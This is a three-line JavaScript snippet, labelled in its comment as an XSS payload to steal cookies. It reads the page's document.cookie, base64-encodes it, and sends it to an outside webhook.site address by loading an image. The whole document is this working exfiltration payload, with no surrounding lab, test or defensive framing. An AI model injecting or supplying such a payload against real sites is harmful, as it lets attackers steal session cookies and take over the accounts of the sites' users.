// XSS Payload to steal cookies
var img = new Image();
img.src = 'https://webhook.site/2c52a068-bf88-427b-bda5-8f5373bc935c?data=' + btoa(document.cookie);
